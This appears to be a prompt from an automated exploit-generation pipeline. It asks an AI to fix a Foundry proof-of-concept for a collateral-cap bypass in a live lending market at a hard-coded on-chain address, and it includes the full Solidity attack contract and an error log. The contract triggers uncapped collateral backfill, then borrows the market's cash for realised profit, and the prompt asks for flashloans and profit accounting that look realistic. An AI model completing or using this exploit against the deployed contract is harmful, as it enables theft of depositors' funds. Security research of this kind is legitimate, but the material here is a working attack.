You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Collateral cap is unenforceable for pre-upgrade balances in upgraded collateral-cap markets
- claim: When a live market is upgraded to `CCollateralCapErc20CheckRepayDelegate`, `_becomeImplementation` initializes `internalCash` but does not backfill `totalCollateralTokens` or per-user collateral state. Uninitialized legacy accounts still have their full `accountTokens` counted by `getCTokenBalanceInternal`, but are omitted from `totalCollateralTokens`. Later, `initializeAccountCollateralTokens` copies a legacy member's entire historical balance into `accountCollateralTokens` and adds it to `totalCollateralTokens` without enforcing `collateralCap`, whereas only fresh collateral growth through `increaseUserCollateralInternal` is cap-checked.
- impact: Governance cannot rely on the configured collateral cap after upgrading an already-live market. Legacy suppliers can continue using uncapped balances as collateral, and once they touch the market those balances are backfilled into collateral accounting without any cap enforcement. This defeats the intended market-wide collateral limit and can let the protocol support materially more borrowable collateral than intended, increasing insolvency and bad-debt risk.
- exploit_paths: ["Upgrade an existing live `CErc20Delegator` market to the collateral-cap implementation.", "Because `_becomeImplementation` does not migrate collateral accounting, `totalCollateralTokens` starts below actual collateral usage while legacy balances still count in account snapshots.", "A pre-upgrade supplier later mints, redeems, transfers, or is involved in a seizure, triggering `initializeAccountCollateralTokens`.", "That function credits the account's full legacy balance as collateral and increments `totalCollateralTokens` without applying the configured `collateralCap`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

    function getAccountLiquidity(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );

    function oracle() external view returns (address);
}

interface ICTokenLike {
    function underlying() external view returns (address);

    function comptroller() external view returns (address);

    function implementation() external view returns (address);

    function collateralCap() external view returns (uint256);

    function totalCollateralTokens() external view returns (uint256);

    function accountCollateralTokens(address account) external view returns (uint256);

    function isCollateralTokenInit(address account) external view returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function getCash() external view returns (uint256);

    function redeem(uint256 redeemTokens) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address public constant VULNERABLE_IMPLEMENTATION = 0x96cc0f947b6c8f4675159ea03144f8c17d5a2fc8;

    uint8 public constant REASON_NONE = 0;
    uint8 public constant REASON_CAP_NOT_SET = 1;
    uint8 public constant REASON_NO_LEGACY_BALANCE = 2;
    uint8 public constant REASON_ALREADY_INITIALIZED = 3;
    uint8 public constant REASON_ENTER_MARKET_FAILED = 4;
    uint8 public constant REASON_TOUCH_FAILED = 5;
    uint8 public constant REASON_NO_BACKFILL = 6;
    uint8 public constant REASON_NO_LIQUIDITY = 7;
    uint8 public constant REASON_NO_PRICE_OR_CASH = 8;
    uint8 public constant REASON_BORROW_ZERO = 9;
    uint8 public constant REASON_BORROW_FAILED = 10;

    address private immutable _profitToken;
    bool private immutable _hypothesisValidated;

    uint256 private _profitAmount;
    bool private _executed;

    uint8 public lastFailureReason;
    uint256 public collateralCapObserved;
    uint256 public totalCollateralTokensBefore;
    uint256 public totalCollateralTokensAfter;
    uint256 public verifierCTokenBalanceBefore;
    uint256 public verifierCollateralBefore;
    uint256 public verifierCollateralAfter;
    uint256 public accountLiquidityAfter;
    uint256 public accountShortfallAfter;
    uint256 public borrowAttemptAmount;
    uint256 public borrowResultCode;

    constructor() {
        ICTokenLike target = ICTokenLike(TARGET);
        _profitToken = target.underlying();
        _hypothesisValidated =
            target.implementation() == VULNERABLE_IMPLEMENTATION &&
            target.collateralCap() > 0;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ICTokenLike target = ICTokenLike(TARGET);
        IComptrollerLike comptroller = IComptrollerLike(target.comptroller());
        uint256 startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        collateralCapObserved = target.collateralCap();
        totalCollateralTokensBefore = target.totalCollateralTokens();
        verifierCTokenBalanceBefore = target.balanceOf(address(this));
        verifierCollateralBefore = target.accountCollateralTokens(address(this));

        if (collateralCapObserved == 0) {
            lastFailureReason = REASON_CAP_NOT_SET;
            return;
        }

        /*
         * The exploit path requires a pre-upgrade supplier whose historical cToken balance still exists
         * while `isCollateralTokenInit[account] == false`.
         *
         * A freshly deployed verifier contract cannot satisfy that condition on its own: it did not hold any
         * target-market balance before the historical implementation upgrade, and every reachable public action
         * that would backfill collateral state operates on `msg.sender` or on balances/allowances the verifier
         * already controls. Without impersonation, arbitrary storage writes, or third-party cooperation, the
         * verifier cannot force an unrelated legacy supplier to "touch the market" for profit extraction.
         */
        if (verifierCTokenBalanceBefore == 0) {
            lastFailureReason = REASON_NO_LEGACY_BALANCE;
            return;
        }

        if (target.isCollateralTokenInit(address(this))) {
            lastFailureReason = REASON_ALREADY_INITIALIZED;
            return;
        }

        address[] memory markets = new address[](1);
        markets[0] = TARGET;
        uint256[] memory enterResults = comptroller.enterMarkets(markets);
        if (enterResults.length == 0 || enterResults[0] != 0) {
            lastFailureReason = REASON_ENTER_MARKET_FAILED;
            return;
        }

        /*
         * A zero-token redeem is the smallest realistic public market touch that still executes the target's
         * initialization path, preserving the exact causality from the hypothesis.
         */
        uint256 touchResult = target.redeem(0);
        if (touchResult != 0) {
            lastFailureReason = REASON_TOUCH_FAILED;
            return;
        }

        verifierCollateralAfter = target.accountCollateralTokens(address(this));
        totalCollateralTokensAfter = target.totalCollateralTokens();

        if (verifierCollateralAfter <= verifierCollateralBefore || totalCollateralTokensAfter <= totalCollateralTokensBefore) {
            lastFailureReason = REASON_NO_BACKFILL;
            return;
        }

        (uint256 err, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(this));
        accountLiquidityAfter = liquidity;
        accountShortfallAfter = shortfall;
        if (err != 0 || liquidity == 0 || shortfall != 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            return;
        }

        uint256 price = IPriceOracleLike(comptroller.oracle()).getUnderlyingPrice(TARGET);
        uint256 cash = target.getCash();
        if (price == 0 || cash == 0) {
            lastFailureReason = REASON_NO_PRICE_OR_CASH;
            return;
        }

        uint256 maxBorrowFromLiquidity = (liquidity * 1e18) / price;
        uint256 cappedByCash = (cash * 9990) / 10000;
        borrowAttemptAmount = (maxBorrowFromLiquidity * 9950) / 10000;
        if (borrowAttemptAmount > cappedByCash) {
            borrowAttemptAmount = cappedByCash;
        }
        if (borrowAttemptAmount == 0) {
            lastFailureReason = REASON_BORROW_ZERO;
            return;
        }

        borrowResultCode = target.borrow(borrowAttemptAmount);
        if (borrowResultCode != 0) {
            lastFailureReason = REASON_BORROW_FAILED;
            return;
        }

        uint256 endingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (endingProfitBalance > startingProfitBalance) {
            _profitAmount = endingProfitBalance - startingProfitBalance;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "historical CErc20Delegator upgrade -> missing collateral migration -> legacy supplier market touch backfills uncapped collateral -> borrow against backfilled collateral";
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
